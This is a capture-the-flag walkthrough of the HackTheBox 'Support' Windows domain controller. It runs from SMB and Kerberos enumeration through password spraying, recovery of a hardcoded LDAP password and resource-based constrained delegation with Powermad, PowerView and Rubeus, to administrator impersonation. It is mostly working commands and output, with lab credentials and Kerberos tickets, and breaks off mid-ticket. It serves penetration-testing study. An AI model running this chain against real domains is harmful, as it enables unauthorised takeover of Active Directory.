# Support

# User Flag

## NMAP Enumeration

NMAP Port Scan:

```bash
sudo nmap -T5 --open -sS -vvv --min-rate=300 --max-retries=3 -p- -oN all-ports-nmap-report 10.10.11.174

# Output
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49668/tcp open  unknown          syn-ack ttl 127
49676/tcp open  unknown          syn-ack ttl 127
49679/tcp open  unknown          syn-ack ttl 127
49754/tcp open  unknown          syn-ack ttl 127
53009/tcp open  unknown          syn-ack ttl 127
```

NMAP Service Scan:

```bash
nmap -sV -sC -Pn -v -oN nmap-report 10.10.11.174 -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49668,49676,49679,49754,53009

# Output
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-06-03 14:36:18Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49679/tcp open  msrpc         Microsoft Windows RPC
49754/tcp open  msrpc         Microsoft Windows RPC
53009/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-06-03T14:37:10
|_  start_date: N/A
```

## SMB Enumeration

The `enum4linux` tool shows null session are enabled:

```bash
enum4linux -A 10.10.11.174

[+] Server 10.10.11.174 allows sessions using username '', password ''
```

Performed NULL attack and enumerated shares:

```bash
smbclient -L //10.10.11.174 -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        support-tools   Disk      support staff tools
        SYSVOL          Disk      Logon server share
```

Used `smbclient` to access `support-tools` share.

```bash
smbclient //10.10.11.174/support-tools -N

# Output
smb: \> dir
  .                                   D        0  Wed Jul 20 18:01:06 2022
  ..                                  D        0  Sat May 28 12:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 12:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 12:19:55 2022
  putty.exe                           A  1273576  Sat May 28 12:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 12:19:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 18:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 12:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 12:19:43 2022
```

Used `crackmapexec` to enumerate users.

```bash
crackmapexec smb 10.10.11.174 -u 'guest' -p '' --rid-brute

# Output
SMB         10.10.11.174    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.174    445    DC               [+] support.htb\guest: 
SMB         10.10.11.174    445    DC               [+] Brute forcing RIDs
SMB         10.10.11.174    445    DC               498: SUPPORT\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.174    445    DC               500: SUPPORT\Administrator (SidTypeUser)
SMB         10.10.11.174    445    DC               501: SUPPORT\Guest (SidTypeUser)
SMB         10.10.11.174    445    DC               502: SUPPORT\krbtgt (SidTypeUser)
SMB         10.10.11.174    445    DC               512: SUPPORT\Domain Admins (SidTypeGroup)
SMB         10.10.11.174    445    DC               513: SUPPORT\Domain Users (SidTypeGroup)
SMB         10.10.11.174    445    DC               514: SUPPORT\Domain Guests (SidTypeGroup)
SMB         10.10.11.174    445    DC               515: SUPPORT\Domain Computers (SidTypeGroup)
SMB         10.10.11.174    445    DC               516: SUPPORT\Domain Controllers (SidTypeGroup)
SMB         10.10.11.174    445    DC               517: SUPPORT\Cert Publishers (SidTypeAlias)
SMB         10.10.11.174    445    DC               518: SUPPORT\Schema Admins (SidTypeGroup)
SMB         10.10.11.174    445    DC               519: SUPPORT\Enterprise Admins (SidTypeGroup)
SMB         10.10.11.174    445    DC               520: SUPPORT\Group Policy Creator Owners (SidTypeGroup)
SMB         10.10.11.174    445    DC               521: SUPPORT\Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.174    445    DC               522: SUPPORT\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.10.11.174    445    DC               525: SUPPORT\Protected Users (SidTypeGroup)
SMB         10.10.11.174    445    DC               526: SUPPORT\Key Admins (SidTypeGroup)
SMB         10.10.11.174    445    DC               527: SUPPORT\Enterprise Key Admins (SidTypeGroup)
SMB         10.10.11.174    445    DC               553: SUPPORT\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.11.174    445    DC               571: SUPPORT\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.174    445    DC               572: SUPPORT\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.174    445    DC               1000: SUPPORT\DC$ (SidTypeUser)
SMB         10.10.11.174    445    DC               1101: SUPPORT\DnsAdmins (SidTypeAlias)
SMB         10.10.11.174    445    DC               1102: SUPPORT\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.11.174    445    DC               1103: SUPPORT\Shared Support Accounts (SidTypeGroup)
SMB         10.10.11.174    445    DC               1104: SUPPORT\ldap (SidTypeUser)
SMB         10.10.11.174    445    DC               1105: SUPPORT\support (SidTypeUser)
SMB         10.10.11.174    445    DC               1106: SUPPORT\smith.rosario (SidTypeUser)
SMB         10.10.11.174    445    DC               1107: SUPPORT\hernandez.stanley (SidTypeUser)
SMB         10.10.11.174    445    DC               1108: SUPPORT\wilson.shelby (SidTypeUser)
SMB         10.10.11.174    445    DC               1109: SUPPORT\anderson.damian (SidTypeUser)
SMB         10.10.11.174    445    DC               1110: SUPPORT\thomas.raphael (SidTypeUser)
SMB         10.10.11.174    445    DC               1111: SUPPORT\levine.leopoldo (SidTypeUser)
SMB         10.10.11.174    445    DC               1112: SUPPORT\raven.clifton (SidTypeUser)
SMB         10.10.11.174    445    DC               1113: SUPPORT\bardot.mary (SidTypeUser)
SMB         10.10.11.174    445    DC               1114: SUPPORT\cromwell.gerard (SidTypeUser)
SMB         10.10.11.174    445    DC               1115: SUPPORT\monroe.david (SidTypeUser)
SMB         10.10.11.174    445    DC               1116: SUPPORT\west.laura (SidTypeUser)
SMB         10.10.11.174    445    DC               1117: SUPPORT\langley.lucy (SidTypeUser)
SMB         10.10.11.174    445    DC               1118: SUPPORT\daughtler.mabel (SidTypeUser)
SMB         10.10.11.174    445    DC               1119: SUPPORT\stoll.rachelle (SidTypeUser)
SMB         10.10.11.174    445    DC               1120: SUPPORT\ford.victoria (SidTypeUser)
SMB         10.10.11.174    445    DC               2601: SUPPORT\MANAGEMENT$ (SidTypeUser)
```



## Keberos

```bash
./kerbrute_linux_amd64 userenum --dc 10.10.11.174 -d support.htb -o /home/kali/Downloads/HackTheBox/Support/kerbrute-user-enum /home/kali/Downloads/HackTheBox/Support/userlist

2024/06/03 16:38:39 >  [+] VALID USERNAME:       ford.victoria@support.htb
2024/06/03 16:38:39 >  [+] VALID USERNAME:       stoll.rachelle@support.htb
2024/06/03 16:38:39 >  [+] VALID USERNAME:       MANAGEMENT$@support.htb
2024/06/03 16:38:39 >  [+] VALID USERNAME:       daughtler.mabel@support.htb
2024/06/03 16:38:39 >  [+] VALID USERNAME:       cromwell.gerard@support.htb
2024/06/03 16:38:39 >  [+] VALID USERNAME:       monroe.david@support.htb
2024/06/03 16:38:39 >  [+] VALID USERNAME:       west.laura@support.htb
2024/06/03 16:38:39 >  [+] VALID USERNAME:       bardot.mary@support.htb
2024/06/03 16:38:39 >  [+] VALID USERNAME:       langley.lucy@support.htb
2024/06/03 16:38:39 >  [+] VALID USERNAME:       raven.clifton@support.htb
2024/06/03 16:38:39 >  [+] VALID USERNAME:       levine.leopoldo@support.htb
2024/06/03 16:38:39 >  [+] VALID USERNAME:       thomas.raphael@support.htb
2024/06/03 16:38:39 >  [+] VALID USERNAME:       support@support.htb
2024/06/03 16:38:39 >  [+] VALID USERNAME:       smith.rosario@support.htb
2024/06/03 16:38:39 >  [+] VALID USERNAME:       hernandez.stanley@support.htb
2024/06/03 16:38:39 >  [+] VALID USERNAME:       wilson.shelby@support.htb
2024/06/03 16:38:39 >  [+] VALID USERNAME:       anderson.damian@support.htb
2024/06/03 16:38:39 >  [+] VALID USERNAME:       ldap@support.htb
2024/06/03 16:38:39 >  [+] VALID USERNAME:       DC$@support.htb
```

Tried checking for ASREPRoasting but this failed:

```bash
sudo python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py support.htb/ -dc-ip 10.10.11.174 -usersfile userlist -no-pass -request -outputfile kerberos-users-found
```

## UserInfo.exe - Static & Dynamic Analysis 

Found `UserInfo.exe.zip` on publicly exposed SMB share and copied it to my kali machine. Unzipping the file, I get an executable titled `UserInfo.exe`, which looks to be a .NET application.

```bash
UserInfo.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections
```

Copied the file to my FlareVM machine and opened it in `dnSpy` to reverse engineer it. Reviewing the code, I can see that to query User Information, the executable uses the LDAP protocol. 

```cs
public LdapQuery()
{
        string password = Protected.getPassword();
        this.entry = new DirectoryEntry("LDAP://support.htb", "support\\ldap", password);
        this.entry.AuthenticationType = AuthenticationTypes.Secure;
        this.ds = new DirectorySearcher(this.entry);
}
```

To authenticate, the program uses the `getPassword()` function.

```cs
public static string getPassword()
{
	byte[] array = Convert.FromBase64String(Protected.enc_password);
	byte[] array2 = array;
	for (int i = 0; i < array.Length; i++)
	{
		array2[i] = (array[i] ^ Protected.key[i % Protected.key.Length] ^ 223);
	}
	return Encoding.Default.GetString(array2);
}
```

This `getPassword()` function makes reference to `Protected.enc_password`, a protected varible which contains the encrypted password.

```cs
private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";
```

The code also makes reference to protected `key` variable:

```cs
private static byte[] key = Encoding.ASCII.GetBytes("armando");
```

Based on the information above, I created a simple python script titled [decrypt_password.py](https://github.com/timmccann222/Public-Writeups-Library/blob/main/HackTheBox/Windows%20Machines/Support/Scripts/decrypt_password.py) to decode the encrypted password.

Alertnatively, since the program uses the LDAP protocol which does not use encryption, we can run the code and capture the password in wireshark. I created an entry in my `hosts` file for `support.htb`and spun up Wireshark to list on the tunnel interface (tun0). I provided one of the user I enumertaed earlier as input and executed the binary.

```bash
mono UserInfo.exe user -username smith.rosario@support.htb
```

![Wireshark](https://github.com/timmccann222/Public-Writeups-Library/blob/main/HackTheBox/Windows%20Machines/Support/Images/LDAP%20Wireshark.png)

We can see that Wireshark captured the decrypted password `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`.

## LDAP Enumeration

Used kerbrute to perform a password spray attack and returned a successful login for the user `ldap`.

```bash
./kerbrute_linux_amd64 passwordspray --dc 10.10.11.174 -d support.htb /home/kali/Downloads/HackTheBox/Support/userlist 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'

2024/06/08 12:34:23 >  [+] VALID LOGIN:  ldap@support.htb:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

Bloodhound did not return any results of interest, performing ldap enumeration did return a password for the user `support`:

```
# support, Users, support.htb
dn: CN=support,CN=Users,DC=support,DC=htb
....etc.....
info: Ironside47pleasure40Watchful
memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
uSNChanged: 12630
....etc.....
```

New set of credentials: `support:Ironside47pleasure40Watchful`.

Used `evil-winrm` and got the user flag.

```bash
*Evil-WinRM* PS C:\Users\support\Desktop> dir


    Directory: C:\Users\support\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---          6/8/2024   4:13 AM             34 user.txt
```

# Root Flag

## Bloodhound

Ran `bloodhound-python` to enumerate AD environment:

```bash
bloodhound-python -ns 10.10.11.174 -d support.htb -dc support.htb -u support -p Ironside47pleasure40Watchful -c All
```

Uploaded JSON files to bloodhound and searched for our AD account `support@support.htb` and `ldap@support.htb` in Bloodhound in the search bar. Next, I right clicked the user nodes and marked them as owned. In the Queries tab, I selected the pre-built query "Shortest Path from Owned Principals".

**N.B.** Bloodhound appears to default to the edge case `CanPSRemote` for both owned principles, deleted edge case to view other potential paths.

![Bloodhound](https://github.com/timmccann222/Public-Writeups-Library/blob/main/HackTheBox/Windows%20Machines/Support/Images/BloodHound.png)

Looking at Bloodhound, the support user is a member of the Shared `Support Accounts` group, which has `GenericAll` on the computer object, `DC.SUPPORT.HTB`.

To exploit this, we need to keep track of the following information:

* Target Computer name
* Admin on Target Computer
* Fake Computer Name
* Fake Computer SID
* Fake Computer Password

We will also need the following scripts and upload them to the target:

* `PowerView.ps1`
* `PowerMad.ps1`
* `Rubeus.exe` (pre-compiled exes from SharpCollection)

```bash
*Evil-WinRM* PS C:\Users\support\Documents> dir


    Directory: C:\Users\support\Documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          6/8/2024   7:28 AM         135586 powermad.ps1
-a----          6/8/2024   7:29 AM         904191 powerview.ps1
-a----          6/8/2024   7:30 AM         446976 Rubeus.exe
-a----          6/8/2024   6:42 AM        2387456 winPEASx64.exe

# Executed files
*Evil-WinRM* PS C:\Users\support\Documents> . .\powermad.ps1
*Evil-WinRM* PS C:\Users\support\Documents> . .\powerview.ps1
```

### Verify Environment - Bloodhound & PowerView

In Bloodhound, we saw that the name of the target computer is `DC.SUPPORT.HTB` and, by clicking the node and looking at "unrolled admins", we can see that the admin on the target machine is `ADMINISTRATOR@SUPPORT.HTB`.

![Bloodhound Admins](https://github.com/timmccann222/Public-Writeups-Library/blob/main/HackTheBox/Windows%20Machines/Support/Images/BloodHound%20DC%20Admins.png)

Verify that users can add machines to the domain and could see that the quote is set to the default of 10, which is good.

```bash
*Evil-WinRM* PS C:\Users\support\Documents> Get-DomainObject -Identity 'DC=SUPPORT,DC=HTB' | select ms-ds-machineaccountquota

ms-ds-machineaccountquota
-------------------------
                       10
```

Verify that there’s a 2012+ DC in the environment:

```bash
*Evil-WinRM* PS C:\Users\support\Documents> Get-DomainController | select name,osversion | fl


Name      : dc.support.htb
OSVersion : Windows Server 2022 Standard
```

Check that the `msds-allowedtoactonbehalfofotheridentity` is empty, which it is:

```bash
*Evil-WinRM* PS C:\Users\support\Documents> Get-DomainComputer DC | select name,msds-allowedtoactonbehalfofotheridentity

name msds-allowedtoactonbehalfofotheridentity
---- ----------------------------------------
DC
```

### Create FakeComputer - PowerMad

Used the Powermad `New-MachineAccount` to create a fake computer:

```bash
*Evil-WinRM* PS C:\Users\support\Documents> New-MachineAccount -MachineAccount 0xdfFakeComputer -Password $(ConvertTo-SecureString '0xdf0xdf123' -AsPlainText -Force)
[+] Machine account 0xdfFakeComputer added
```

I need the SID of the computer object as well, so I’ll save it in a variable:

```bash
*Evil-WinRM* PS C:\Users\support\Documents> $fakesid = Get-DomainComputer 0xdfFakeComputer | select -expand objectsid
*Evil-WinRM* PS C:\Users\support\Documents> $fakesid
S-1-5-21-1677581083-3380853377-188903654-5601
```

### Attack

Now I’ll configure the DC to trust my fake computer to make authorization decisions on it’s behalf. These commands will create an ACL with the fake computer’s SID and assign that to the DC:

```bash
*Evil-WinRM* PS C:\Users\support\Documents> $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($fakesid))"
*Evil-WinRM* PS C:\Users\support\Documents> $SDBytes = New-Object byte[] ($SD.BinaryLength)
*Evil-WinRM* PS C:\Users\support\Documents> $SD.GetBinaryForm($SDBytes, 0)
*Evil-WinRM* PS C:\Users\support\Documents> Get-DomainComputer DC | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

Verify that there is an ACL with the `SecurityIdentifier` of my fake computer and it says `AccessAllowed`.


```bash
*Evil-WinRM* PS C:\Users\support\Documents> $RawBytes = Get-DomainComputer DC -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
*Evil-WinRM* PS C:\Users\support\Documents> $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
*Evil-WinRM* PS C:\Users\support\Documents> $Descriptor.DiscretionaryAcl


BinaryLength       : 36
AceQualifier       : AccessAllowed
IsCallback         : False
OpaqueLength       : 0
AccessMask         : 983551
SecurityIdentifier : S-1-5-21-1677581083-3380853377-188903654-5601
AceType            : AccessAllowed
AceFlags           : None
IsInherited        : False
InheritanceFlags   : None
PropagationFlags   : None
AuditFlags         : None
```

## Auth as Fake Computer

Use Rubeus to get the hash of my fake computer account:

```bash
*Evil-WinRM* PS C:\Users\support\Documents> .\Rubeus.exe hash /password:0xdf0xdf123 /user:0xdfFakeComputer /domain:support.htb

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0


[*] Action: Calculate Password Hash(es)

[*] Input password             : 0xdf0xdf123
[*] Input username             : 0xdfFakeComputer
[*] Input domain               : support.htb
[*] Salt                       : SUPPORT.HTB0xdfFakeComputer
[*]       rc4_hmac             : B1809AB221A7E1F4545BD9E24E49D5F4
[*]       aes128_cts_hmac_sha1 : 0606EB253C5CDCF0A162194DFB8D36BD
[*]       aes256_cts_hmac_sha1 : 5615BE33C94A8FEAED46F39DAFB86E6A24F3707DD60CDF4AAD5B41751A111A64
[*]       des_cbc_md5          : 37C76E1AA7E99E2F
```

We need the one labeled rc4_hmac, which I’ll pass to Rubeus to get a ticket for administrator:

```bash
*Evil-WinRM* PS C:\Users\support\Documents> .\Rubeus.exe s4u /user:0xdfFakeComputer$ /rc4:B1809AB221A7E1F4545BD9E24E49D5F4 /impersonateuser:administrator /msdsspn:cifs/dc.support.htb /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: S4U

[*] Using rc4_hmac hash: B1809AB221A7E1F4545BD9E24E49D5F4
[*] Building AS-REQ (w/ preauth) for: 'support.htb\0xdfFakeComputer$'
[*] Using domain controller: ::1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFvjCCBbqgAwIBBaEDAgEWooIEzTCCBMlhggTFMIIEwaADAgEFoQ0bC1NVUFBPUlQuSFRCoiAwHqAD
      AgECoRcwFRsGa3JidGd0GwtzdXBwb3J0Lmh0YqOCBIcwggSDoAMCARKhAwIBAqKCBHUEggRxywbRE3hA
      cROdVj4dSLIVUQTNPhQXwxCpHGEHeEAFZR4ZqqPd/G2hj20h5iPIWNXXLuZrTyr7LJqS0jpH8n+bVMFF
      sYpSR6XAo1IjICHGhKW73UAe+NjqV2CoIIbVHV5uk6XN1UonSAIGWwlwJ0jhMbLb/aEWy+ylwXspfLME
      ugoBrCDg4vsc1G+tui9JwmlUyFjvoJF3ck3t20hXcRNQYKCn0Cs59pmiCMep/Pzk9E7ATxQRpm9FBdOO
      xvckz/DGPn8Ya17wWo5YL+6kylRlgm84XbJbGkhBHPkAESlZ5okOhG4Cr4Nda/i1I7us49HT2XyIxpcX
      EBwTci4LpSu3qdTmLMxsB8HATVFjAeIVJt/ku47AYy3q4KiYFIyOhF47cUNO9Wc9j6/fKZl3OCrM1R7P
      tY3mLfYBmSk+UKqQa68RuMfnVW/8yQPf1htvDjwarvJuFYUQccAbWKBq/SHjtSimAyoUdkrBHyJ0W1MV
      T6hUsozk+PAdH18Z8HqXHFIkl19Rmth6Lz/j/WtsCuLA7cbuUvVk6tZXIlSPjnQfaImqRfJKmlcMkkY/
      eEco/SwVQyS0gy3/r90L6hDLxcpXWKWyJESHjCXGW6hW3FJpxlcMzL8RngNy8IEHHwjYD9ZGQzHiRrmu
      ydEalO/IDQ49+kJIJ/mXWtssPqdnUe4gBFw0XJbQb18Sqh/1FUrN0e2KBFLuRJ9n/aEHQpTKCAF8pytH
      eu/yWCnlMfFrdy7Dg6sAKDdBM0EQMC42u7wJIFAzkwwdM+xQllo7oARtv78UCLLfr6OwNhpdURhMVWhP
      AZr+StVFOD2FkctzvCTRU6b7UpJdctcY/RKxCHEqUoIwpILhUJMwkdI/WFSDpfxORvaAN2VjL6hiY24X
      wE9GbePpQTEeYsVWRDBwp8pyJkYShWuhwtWzXGzWGX3WXN34GGPsRhMo3weFhql0ZtA5H3QfqsC2VMLC
      NkWq25wjudssFufFJTMLisJtoUgHRvwyTFNIYnUxsHE6Xla/AcFUW02nmIlE1h/0vWx8yRDak+BpD0Ju
      jLLUWgU7BAiyGcczYbUDriwn/Sd4PvL/U7B1eG0XX9K/awy22B6kb5YUt15KLKOWA5gV/A5m+ZdGxGkl
      6nIocCmizwyeQeZWYMCAVgZbaRiBELi4YXavXdDn5vEvdZPbP2QQXGrpxaAA8eKjyVyntrlYKlzgpLJb
      +pD6yHuNOC2O2mhHhOFsn1JHgUps5KjqfngnD79vR3ufbpwqwer5MGmaJOk8QkXWqVebuDO5Cqo36mWe
      H3RVrFuk6688+UHEYDUs6J0j9XEVLeDJz2s4S2F9/W9qCUJmQv56FdYXm6l3o7bWua0cdSocNzlLrCQX
      Mok6Lg6TtVxiaZiW/VNaqH2682j1jIUQjHJPYculMDAmjhFxJVYiB3BpNUhd5EPVTJnV9eWmUYrKpTBY
      En45ALLmhyh666amMuljZSgkrzATUq4US3vOwFmBG12GehJEvVKndkS0ffVR+ki8Y7aIo4HcMIHZoAMC
      AQCigdEEgc59gcswgciggcUwgcIwgb+gGzAZoAMCARehEgQQ7AHI9dH0yk8aIzP73NLR2qENGwtTVVBQ
      T1JULkhUQqIeMBygAwIBAaEVMBMbETB4ZGZGYWtlQ29tcHV0ZXIkowcDBQBA4QAApREYDzIwMjQwNjA5
      MTQwMjQ4WqYRGA8yMDI0MDYxMDAwMDI0OFqnERgPMjAyNDA2MTYxNDAyNDhaqA0bC1NVUFBPUlQuSFRC
      qSAwHqADAgECoRcwFRsGa3JidGd0GwtzdXBwb3J0Lmh0Yg==


[*] Action: S4U

[*] Building S4U2self request for: '0xdfFakeComputer$@SUPPORT.HTB'
[*] Using domain controller: dc.support.htb (::1)
[*] Sending S4U2self request to ::1:88
[+] S4U2self success!
[*] Got a TGS for 'administrator' to '0xdfFakeComputer$@SUPPORT.HTB'
[*] base64(ticket.kirbi):

      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
      AgEBoRUwExsRMHhkZkZha2VDb21wdXRlciQ=

[*] Impersonating user 'administrator' to target SPN 'cifs/dc.support.htb'
[*] Building S4U2proxy request for service: 'cifs/dc.support.htb'
[*] Using domain controller: dc.support.htb (::1)
[*] Sending S4U2proxy request to domain controller ::1:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'cifs/dc.support.htb':

      doIGeDCCBnSgAwIBBaEDAgEWooIFijCCBYZhggWCMIIFfqADAgEFoQ0bC1NVUFBPUlQuSFRCoiEwH6AD
      AgECoRgwFhsEY2lmcxsOZGMuc3VwcG9ydC5odGKjggVDMIIFP6ADAgESoQMCAQaiggUxBIIFLdgK1ZVp
      Q2h2wjozs7PbzzHcgssNrRRUFViu4UuLyydlKZFZp+geeXm0BDfHSzMXvbKD2LP5ZLrf2H+gMbUEIyFx
      y0FJCm3Ev9a6mXAOJJKHEWvbr4ItCcKj9tL9yJ/O47K/zF0JsHdsiotjA3ZC5rrUwN2teUnGXyXnZCDW
      j8XIGoEJGdhrR1Q5530fKd3+Tr9PbQpzjUsQafFDGiZDnmkZcKAPWTcaQfcQbmxizEXqqTYQ2YKwjBBj
      XGxeWOrcf5JAExDhTEwTgSuD9U/YC7fZLAiX2MykY4cQ3BGc7VFjynthjBq07Gx89LU/sa8ej/sZe0Tf
      KITYW5+JO2TQZsMvMAs6R/Ja0dDutD3QMpOiwkBs9S7SOWyHlLWS3u8SFIDP0BTwRLyG5LXnQTER9pDl
      Z3a+kecHL0kruBVvo+wIrRVSc1cUgsHh8HMhtRRdBSbwz2tGTaPGcCc8p/+NraUWf/PEodIxSoULv6pM
      ZMCGG/Qm63KlmNOvXNkRu1f287Ig5+UeaxogZ74SQZEF0BDFG1VAvOlwKJHe6+WOcHHJxR7Skie9pKZu
